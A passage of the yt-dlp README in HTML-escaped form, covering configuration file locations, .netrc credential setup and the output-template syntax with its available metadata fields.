   &lt;li&gt;&lt;code&gt;yt-dlp.conf&lt;/code&gt; in the home path given to &lt;code&gt;-P&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;If &lt;code&gt;-P&lt;/code&gt; is not given, the current directory is searched&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;User Configuration&lt;/strong&gt;:&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;${XDG_CONFIG_HOME}/yt-dlp.conf&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;${XDG_CONFIG_HOME}/yt-dlp/config&lt;/code&gt; (recommended on Linux/macOS)&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;${XDG_CONFIG_HOME}/yt-dlp/config.txt&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;${APPDATA}/yt-dlp.conf&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;${APPDATA}/yt-dlp/config&lt;/code&gt; (recommended on Windows)&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;${APPDATA}/yt-dlp/config.txt&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;~/yt-dlp.conf&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;~/yt-dlp.conf.txt&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;~/.yt-dlp/config&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;~/.yt-dlp/config.txt&lt;/code&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;p&gt;See also: &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#notes-about-environment-variables"&gt;Notes about environment variables&lt;/a&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;System Configuration&lt;/strong&gt;:&lt;/p&gt; 
  &lt;ul&gt; 
   &lt;li&gt;&lt;code&gt;/etc/yt-dlp.conf&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;/etc/yt-dlp/config&lt;/code&gt;&lt;/li&gt; 
   &lt;li&gt;&lt;code&gt;/etc/yt-dlp/config.txt&lt;/code&gt;&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;E.g. with the following configuration file, yt-dlp will always extract the audio, copy the mtime, use a proxy and save all videos under &lt;code&gt;YouTube&lt;/code&gt; directory in your home directory:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;# Lines starting with # are comments

# Always extract audio
-x

# Copy the mtime
--mtime

# Use this proxy
--proxy 127.0.0.1:3128

# Save all videos under YouTube directory in your home directory
-o ~/YouTube/%(title)s.%(ext)s
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: Options in a configuration file are just the same options aka switches used in regular command line calls; thus there &lt;strong&gt;must be no whitespace&lt;/strong&gt; after &lt;code&gt;-&lt;/code&gt; or &lt;code&gt;--&lt;/code&gt;, e.g. &lt;code&gt;-o&lt;/code&gt; or &lt;code&gt;--proxy&lt;/code&gt; but not &lt;code&gt;- o&lt;/code&gt; or &lt;code&gt;-- proxy&lt;/code&gt;. They must also be quoted when necessary, as if it were a UNIX shell.&lt;/p&gt; 
&lt;p&gt;You can use &lt;code&gt;--ignore-config&lt;/code&gt; if you want to disable all configuration files for a particular yt-dlp run. If &lt;code&gt;--ignore-config&lt;/code&gt; is found inside any configuration file, no further configuration will be loaded. For example, having the option in the portable configuration file prevents loading of home, user, and system configurations. Additionally, (for backward compatibility) if &lt;code&gt;--ignore-config&lt;/code&gt; is found inside the system configuration file, the user configuration is not loaded.&lt;/p&gt; 
&lt;h3&gt;Configuration file encoding&lt;/h3&gt; 
&lt;p&gt;The configuration files are decoded according to the UTF BOM if present, and in the encoding from system locale otherwise.&lt;/p&gt; 
&lt;p&gt;If you want your file to be decoded differently, add &lt;code&gt;# coding: ENCODING&lt;/code&gt; to the beginning of the file (e.g. &lt;code&gt;# coding: shift-jis&lt;/code&gt;). There must be no characters before that, even spaces or BOM.&lt;/p&gt; 
&lt;h3&gt;Authentication with netrc&lt;/h3&gt; 
&lt;p&gt;You may also want to configure automatic credentials storage for extractors that support authentication (by providing login and password with &lt;code&gt;--username&lt;/code&gt; and &lt;code&gt;--password&lt;/code&gt;) in order not to pass credentials as command line arguments on every yt-dlp execution and prevent tracking plain text passwords in the shell command history. You can achieve this using a &lt;a href="https://stackoverflow.com/tags/.netrc/info"&gt;&lt;code&gt;.netrc&lt;/code&gt; file&lt;/a&gt; on a per-extractor basis. For that, you will need to create a &lt;code&gt;.netrc&lt;/code&gt; file in &lt;code&gt;--netrc-location&lt;/code&gt; and restrict permissions to read/write by only you:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;touch ${HOME}/.netrc
chmod a-rwx,u+rw ${HOME}/.netrc
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;After that, you can add credentials for an extractor in the following format, where &lt;em&gt;extractor&lt;/em&gt; is the name of the extractor in lowercase:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;machine &amp;lt;extractor&amp;gt; login &amp;lt;username&amp;gt; password &amp;lt;password&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;E.g.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;machine youtube login myaccount@gmail.com password my_youtube_password
machine twitch login my_twitch_account_name password my_twitch_password
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;To activate authentication with the &lt;code&gt;.netrc&lt;/code&gt; file you should pass &lt;code&gt;--netrc&lt;/code&gt; to yt-dlp or place it in the &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#configuration"&gt;configuration file&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;The default location of the .netrc file is &lt;code&gt;~&lt;/code&gt; (see below).&lt;/p&gt; 
&lt;p&gt;As an alternative to using the &lt;code&gt;.netrc&lt;/code&gt; file, which has the disadvantage of keeping your passwords in a plain text file, you can configure a custom shell command to provide the credentials for an extractor. This is done by providing the &lt;code&gt;--netrc-cmd&lt;/code&gt; parameter, it shall output the credentials in the netrc format and return &lt;code&gt;0&lt;/code&gt; on success, other values will be treated as an error. &lt;code&gt;{}&lt;/code&gt; in the command will be replaced by the name of the extractor to make it possible to select the credentials for the right extractor.&lt;/p&gt; 
&lt;p&gt;E.g. To use an encrypted &lt;code&gt;.netrc&lt;/code&gt; file stored as &lt;code&gt;.authinfo.gpg&lt;/code&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;yt-dlp --netrc-cmd 'gpg --decrypt ~/.authinfo.gpg' 'https://www.youtube.com/watch?v=BaW_jenozKc'
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Notes about environment variables&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Environment variables are normally specified as &lt;code&gt;${VARIABLE}&lt;/code&gt;/&lt;code&gt;$VARIABLE&lt;/code&gt; on UNIX and &lt;code&gt;%VARIABLE%&lt;/code&gt; on Windows; but is always shown as &lt;code&gt;${VARIABLE}&lt;/code&gt; in this documentation&lt;/li&gt; 
 &lt;li&gt;yt-dlp also allows using UNIX-style variables on Windows for path-like options; e.g. &lt;code&gt;--output&lt;/code&gt;, &lt;code&gt;--config-locations&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;If unset, &lt;code&gt;${XDG_CONFIG_HOME}&lt;/code&gt; defaults to &lt;code&gt;~/.config&lt;/code&gt; and &lt;code&gt;${XDG_CACHE_HOME}&lt;/code&gt; to &lt;code&gt;~/.cache&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;On Windows, &lt;code&gt;~&lt;/code&gt; points to &lt;code&gt;${HOME}&lt;/code&gt; if present; or, &lt;code&gt;${USERPROFILE}&lt;/code&gt; or &lt;code&gt;${HOMEDRIVE}${HOMEPATH}&lt;/code&gt; otherwise&lt;/li&gt; 
 &lt;li&gt;On Windows, &lt;code&gt;${USERPROFILE}&lt;/code&gt; generally points to &lt;code&gt;C:\Users\&amp;lt;user name&amp;gt;&lt;/code&gt; and &lt;code&gt;${APPDATA}&lt;/code&gt; to &lt;code&gt;${USERPROFILE}\AppData\Roaming&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;OUTPUT TEMPLATE&lt;/h1&gt; 
&lt;p&gt;The &lt;code&gt;-o&lt;/code&gt; option is used to indicate a template for the output file names while &lt;code&gt;-P&lt;/code&gt; option is used to specify the path each type of file should be saved to.&lt;/p&gt; 
&lt;!-- MANPAGE: BEGIN EXCLUDED SECTION --&gt; 
&lt;p&gt;&lt;strong&gt;tl;dr:&lt;/strong&gt; &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#output-template-examples"&gt;navigate me to examples&lt;/a&gt;.&lt;/p&gt; 
&lt;!-- MANPAGE: END EXCLUDED SECTION --&gt; 
&lt;p&gt;The simplest usage of &lt;code&gt;-o&lt;/code&gt; is not to set any template arguments when downloading a single file, like in &lt;code&gt;yt-dlp -o funny_video.flv "https://some/video"&lt;/code&gt; (hard-coding file extension like this is &lt;em&gt;not&lt;/em&gt; recommended and could break some post-processing).&lt;/p&gt; 
&lt;p&gt;It may however also contain special sequences that will be replaced when downloading each video. The special sequences may be formatted according to &lt;a href="https://docs.python.org/3/library/stdtypes.html#printf-style-string-formatting"&gt;Python string formatting operations&lt;/a&gt;, e.g. &lt;code&gt;%(NAME)s&lt;/code&gt; or &lt;code&gt;%(NAME)05d&lt;/code&gt;. To clarify, that is a percent symbol followed by a name in parentheses, followed by formatting operations.&lt;/p&gt; 
&lt;p&gt;The field names themselves (the part inside the parenthesis) can also have some special formatting:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Object traversal&lt;/strong&gt;: The dictionaries and lists available in metadata can be traversed by using a dot &lt;code&gt;.&lt;/code&gt; separator; e.g. &lt;code&gt;%(tags.0)s&lt;/code&gt;, &lt;code&gt;%(subtitles.en.-1.ext)s&lt;/code&gt;. You can do Python slicing with colon &lt;code&gt;:&lt;/code&gt;; E.g. &lt;code&gt;%(id.3:7)s&lt;/code&gt;, &lt;code&gt;%(id.6:2:-1)s&lt;/code&gt;, &lt;code&gt;%(formats.:.format_id)s&lt;/code&gt;. Curly braces &lt;code&gt;{}&lt;/code&gt; can be used to build dictionaries with only specific keys; e.g. &lt;code&gt;%(formats.:.{format_id,height})#j&lt;/code&gt;. An empty field name &lt;code&gt;%()s&lt;/code&gt; refers to the entire infodict; e.g. &lt;code&gt;%(.{id,title})s&lt;/code&gt;. Note that all the fields that become available using this method are not listed below. Use &lt;code&gt;-j&lt;/code&gt; to see such fields&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Arithmetic&lt;/strong&gt;: Simple arithmetic can be done on numeric fields using &lt;code&gt;+&lt;/code&gt;, &lt;code&gt;-&lt;/code&gt; and &lt;code&gt;*&lt;/code&gt;. E.g. &lt;code&gt;%(playlist_index+10)03d&lt;/code&gt;, &lt;code&gt;%(n_entries+1-playlist_index)d&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Date/time Formatting&lt;/strong&gt;: Date/time fields can be formatted according to &lt;a href="https://docs.python.org/3/library/datetime.html#strftime-and-strptime-format-codes"&gt;strftime formatting&lt;/a&gt; by specifying it separated from the field name using a &lt;code&gt;&amp;gt;&lt;/code&gt;. E.g. &lt;code&gt;%(duration&amp;gt;%H-%M-%S)s&lt;/code&gt;, &lt;code&gt;%(upload_date&amp;gt;%Y-%m-%d)s&lt;/code&gt;, &lt;code&gt;%(epoch-3600&amp;gt;%H-%M-%S)s&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Alternatives&lt;/strong&gt;: Alternate fields can be specified separated with a &lt;code&gt;,&lt;/code&gt;. E.g. &lt;code&gt;%(release_date&amp;gt;%Y,upload_date&amp;gt;%Y|Unknown)s&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Replacement&lt;/strong&gt;: A replacement value can be specified using a &lt;code&gt;&amp;amp;&lt;/code&gt; separator according to the &lt;a href="https://docs.python.org/3/library/string.html#format-specification-mini-language"&gt;&lt;code&gt;str.format&lt;/code&gt; mini-language&lt;/a&gt;. If the field is &lt;em&gt;not&lt;/em&gt; empty, this replacement value will be used instead of the actual field content. This is done after alternate fields are considered; thus the replacement is used if &lt;em&gt;any&lt;/em&gt; of the alternative fields is &lt;em&gt;not&lt;/em&gt; empty. E.g. &lt;code&gt;%(chapters&amp;amp;has chapters|no chapters)s&lt;/code&gt;, &lt;code&gt;%(title&amp;amp;TITLE={:&amp;gt;20}|NO TITLE)s&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Default&lt;/strong&gt;: A literal default value can be specified for when the field is empty using a &lt;code&gt;|&lt;/code&gt; separator. This overrides &lt;code&gt;--output-na-placeholder&lt;/code&gt;. E.g. &lt;code&gt;%(uploader|Unknown)s&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;More Conversions&lt;/strong&gt;: In addition to the normal format types &lt;code&gt;diouxXeEfFgGcrs&lt;/code&gt;, yt-dlp additionally supports converting to &lt;code&gt;B&lt;/code&gt; = &lt;strong&gt;B&lt;/strong&gt;ytes, &lt;code&gt;j&lt;/code&gt; = &lt;strong&gt;j&lt;/strong&gt;son (flag &lt;code&gt;#&lt;/code&gt; for pretty-printing, &lt;code&gt;+&lt;/code&gt; for Unicode), &lt;code&gt;h&lt;/code&gt; = HTML escaping, &lt;code&gt;l&lt;/code&gt; = a comma-separated &lt;strong&gt;l&lt;/strong&gt;ist (flag &lt;code&gt;#&lt;/code&gt; for &lt;code&gt;\n&lt;/code&gt; newline-separated), &lt;code&gt;q&lt;/code&gt; = a string &lt;strong&gt;q&lt;/strong&gt;uoted for the terminal (flag &lt;code&gt;#&lt;/code&gt; to split a list into different arguments), &lt;code&gt;D&lt;/code&gt; = add &lt;strong&gt;D&lt;/strong&gt;ecimal suffixes (e.g. 10M) (flag &lt;code&gt;#&lt;/code&gt; to use 1024 as factor), and &lt;code&gt;S&lt;/code&gt; = &lt;strong&gt;S&lt;/strong&gt;anitize as filename (flag &lt;code&gt;#&lt;/code&gt; for restricted)&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Unicode normalization&lt;/strong&gt;: The format type &lt;code&gt;U&lt;/code&gt; can be used for NFC &lt;a href="https://docs.python.org/3/library/unicodedata.html#unicodedata.normalize"&gt;Unicode normalization&lt;/a&gt;. The alternate form flag (&lt;code&gt;#&lt;/code&gt;) changes the normalization to NFD and the conversion flag &lt;code&gt;+&lt;/code&gt; can be used for NFKC/NFKD compatibility equivalence normalization. E.g. &lt;code&gt;%(title)+.100U&lt;/code&gt; is NFKC&lt;/p&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;To summarize, the general syntax for a field is:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;%(name[.keys][addition][&amp;gt;strf][,alternate][&amp;amp;replacement][|default])[flags][width][.precision][length]type
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Additionally, you can set different output templates for the various metadata files separately from the general output template by specifying the type of file followed by the template separated by a colon &lt;code&gt;:&lt;/code&gt;. The different file types supported are &lt;code&gt;subtitle&lt;/code&gt;, &lt;code&gt;thumbnail&lt;/code&gt;, &lt;code&gt;description&lt;/code&gt;, &lt;code&gt;annotation&lt;/code&gt; (deprecated), &lt;code&gt;infojson&lt;/code&gt;, &lt;code&gt;link&lt;/code&gt;, &lt;code&gt;pl_thumbnail&lt;/code&gt;, &lt;code&gt;pl_description&lt;/code&gt;, &lt;code&gt;pl_infojson&lt;/code&gt;, &lt;code&gt;chapter&lt;/code&gt;, &lt;code&gt;pl_video&lt;/code&gt;. E.g. &lt;code&gt;-o "%(title)s.%(ext)s" -o "thumbnail:%(title)s\%(title)s.%(ext)s"&lt;/code&gt; will put the thumbnails in a folder with the same name as the video. If any of the templates is empty, that type of file will not be written. E.g. &lt;code&gt;--write-thumbnail -o "thumbnail:"&lt;/code&gt; will write thumbnails only for playlists and not for video.&lt;/p&gt; 
&lt;p&gt;&lt;a id="outtmpl-postprocess-note"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: Due to post-processing (i.e. merging etc.), the actual output filename might differ. Use &lt;code&gt;--print after_move:filepath&lt;/code&gt; to get the name after all post-processing is complete.&lt;/p&gt; 
&lt;p&gt;The available fields are:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;id&lt;/code&gt; (string): Video identifier&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;title&lt;/code&gt; (string): Video title&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;fulltitle&lt;/code&gt; (string): Video title ignoring live timestamp and generic title&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;ext&lt;/code&gt; (string): Video filename extension&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;alt_title&lt;/code&gt; (string): A secondary title of the video&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;description&lt;/code&gt; (string): The description of the video&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;display_id&lt;/code&gt; (string): An alternative identifier for the video&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;uploader&lt;/code&gt; (string): Full name of the video uploader&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;uploader_id&lt;/code&gt; (string): Nickname or id of the video uploader&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;uploader_url&lt;/code&gt; (string): URL to the video uploader's profile&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;license&lt;/code&gt; (string): License name the video is licensed under&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;creators&lt;/code&gt; (list): The creators of the video&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;creator&lt;/code&gt; (string): The creators of the video; comma-separated&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;timestamp&lt;/code&gt; (numeric): UNIX timestamp of the moment the video became available&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;upload_date&lt;/code&gt; (string): Video upload date in UTC (YYYYMMDD)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;release_timestamp&lt;/code&gt; (numeric): UNIX timestamp of the moment the video was released&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;release_date&lt;/code&gt; (string): The date (YYYYMMDD) when the video was released in UTC&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;release_year&lt;/code&gt; (numeric): Year (YYYY) when the video or album was released&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;modified_timestamp&lt;/code&gt; (numeric): UNIX timestamp of the moment the video was last modified&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;modified_date&lt;/code&gt; (string): The date (YYYYMMDD) when the video was last modified in UTC&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;channel&lt;/code&gt; (string): Full name of the channel the video is uploaded on&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;channel_id&lt;/code&gt; (string): Id of the channel&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;channel_url&lt;/code&gt; (string): URL of the channel&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;channel_follower_count&lt;/code&gt; (numeric): Number of followers of the channel&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;channel_is_verified&lt;/code&gt; (boolean): Whether the channel is verified on the platform&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;location&lt;/code&gt; (string): Physical location where the video was filmed&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;duration&lt;/code&gt; (numeric): Length of the video in seconds&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;duration_string&lt;/code&gt; (string): Length of the video (HH:mm:ss)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;view_count&lt;/code&gt; (numeric): How many users have watched the video on the platform&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;concurrent_view_count&lt;/code&gt; (numeric): How many users are currently watching the video on the platform.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;like_count&lt;/code&gt; (numeric): Number of positive ratings of the video&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;dislike_count&lt;/code&gt; (numeric): Number of negative ratings of the video&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;repost_count&lt;/code&gt; (numeric): Number of reposts of the video&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;average_rating&lt;/code&gt; (numeric): Average rating given by users, the scale used depends on the webpage&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;comment_count&lt;/code&gt; (numeric): Number of comments on the video (For some extractors, comments are only downloaded at the end, and so this field cannot be used)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;save_count&lt;/code&gt; (numeric): Number of times the video has been saved or bookmarked&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;age_limit&lt;/code&gt; (numeric): Age restriction for the video (years)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;live_status&lt;/code&gt; (string): One of "not_live", "is_live", "is_upcoming", "was_live", "post_live" (was live, but VOD is not yet processed)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;is_live&lt;/code&gt; (boolean): Whether this video is a live stream or a fixed-length video&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;was_live&lt;/code&gt; (boolean): Whether this video was originally a live stream&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;playable_in_embed&lt;/code&gt; (string): Whether this video is allowed to play in embedded players on other sites&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;availability&lt;/code&gt; (string): Whether the video is "private", "premium_only", "subscriber_only", "needs_auth", "unlisted" or "public"&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;media_type&lt;/code&gt; (string): The type of media as classified by the site, e.g. "episode", "clip", "trailer"&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;start_time&lt;/code&gt; (numeric): Time in seconds where the reproduction should start, as specified in the URL&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;end_time&lt;/code&gt; (numeric): Time in seconds where the reproduction should end, as specified in the URL&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;extractor&lt;/code&gt; (string): Name of the extractor&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;extractor_key&lt;/code&gt; (string): Key name of the extractor&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;epoch&lt;/code&gt; (numeric): Unix epoch of when the information extraction was completed&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;autonumber&lt;/code&gt; (numeric): Number that will be increased with each download, starting at &lt;code&gt;--autonumber-start&lt;/code&gt;, padded with leading zeros to 5 digits&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;video_autonumber&lt;/code&gt; (numeric): Number that will be increased with each video&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;n_entries&lt;/code&gt; (numeric): Total number of extracted items in the playlist&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;playlist_id&lt;/code&gt; (string): Identifier of the playlist that contains the video&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;playlist_title&lt;/code&gt; (string): Name of the playlist that contains the video&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;playlist&lt;/code&gt; (string): &lt;code&gt;playlist_title&lt;/code&gt; if available or else &lt;code&gt;playlist_id&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;playlist_count&lt;/code&gt; (numeric): Total number of items in the playlist. May not be known if entire playlist is not extracted&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;playlist_index&lt;/code&gt; (numeric): Index of the video in the playlist padded with leading zeros according the final index&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;playlist_autonumber&lt;/code&gt; (numeric): Position of the video in the playlist download queue padded with leading zeros according to the total length of the playlist&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;playlist_uploader&lt;/code&gt; (string): Full name of the playlist uploader&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;playlist_uploader_id&lt;/code&gt; (string): Nickname or id of the playlist uploader&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;playlist_channel&lt;/code&gt; (string): Display name of the channel that uploaded the playlist&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;playlist_channel_id&lt;/code&gt; (string): Identifier of the channel that uploaded the playlist&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;playlist_webpage_url&lt;/code&gt; (string): URL of the playlist webpage&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;webpage_url&lt;/code&gt; (string): A URL to the video webpage which, if given to yt-dlp, should yield the same result again&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;webpage_url_basename&lt;/code&gt; (string): The basename of the webpage URL&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;webpage_url_domain&lt;/code&gt; (string): The domain of the webpage URL&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;original_url&lt;/code&gt; (string): The URL given by the user (or the same as &lt;code&gt;webpage_url&lt;/code&gt; for playlist entries)&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;categories&lt;/code&gt; (list): List of categories the video belongs to&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;tags&lt;/code&gt; (list): List of tags assigned to the video&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;cast&lt;/code&gt; (list): List of cast members&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;All the fields in &lt;a href="https://raw.githubusercontent.com/yt-dlp/yt-dlp/master/#filtering-formats"&gt;Filtering Formats&lt;/a&gt; can also be used&lt;/p&gt; 
&lt;p&gt;Available for the video that belongs to some logical chapter or section:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;chapter&lt;/code&gt; (string): Name or title of the chapter the video belongs to&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;chapter_number&lt;/code&gt; (numeric): Number of the chapter the video belongs to&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;chapter_id&lt;/code&gt; (string): Id of the chapter the video belongs to&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Available for the video that is an episode of some series or program:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;series&lt;/code&gt; (string): Title of the series or program the video episode belongs to&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;series_id&lt;/code&gt; (string): Id of the series or program the video episode belongs to&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;season&lt;/code&gt; (string): Title of the season the video episode belongs to&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;season_number&lt;/code&gt; (numeric): Number of the season the video episode belongs to&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;season_id&lt;/code&gt; (string): Id of the season the video episode belongs to&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;episode&lt;/code&gt; (string): Title of the video episode&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;episode_number&lt;/code&gt; (numeric): Number of the video episode within a season&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;episode_id&lt;/code&gt; (string): Id of the video episode&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Available for the media that is a track or a part of a music album:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;track&lt;/code&gt; (string): Title of the track&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;track_number&lt;/code&gt; (numeric): Number of the track within an album or a disc&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;track_id&lt;/code&gt; (string): Id of the track&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;artists&lt;/code&gt; (list): Artist(s) of the track&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;artist&lt;/code&gt; (string): Artist(s) of the track; comma-separated&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;genres&lt;/code&gt; (list): Genre(s) of the track&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;genre&lt;/code&gt; (string): Genre(s) of the track; comma-separated&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;composers&lt;/code&gt; (list): Composer(s) of the piece&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;composer&lt;/code&gt; (string): Composer(s) of the piece; comma-separated&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;album&lt;/code&gt; (string): Title of the album the track belongs to&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;album_type&lt;/code&gt; (string): Type of the album&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;album_artists&lt;/code&gt; (list): All artists appeared on the album&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;album_artist&lt;/code&gt; (string): All artists appeared on the album; comma-separated&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;disc_number&lt;/code&gt; (numeric): Number of the disc or other physical medium the track belongs to&lt;/li&gt; 
&lt;/ul&gt; 
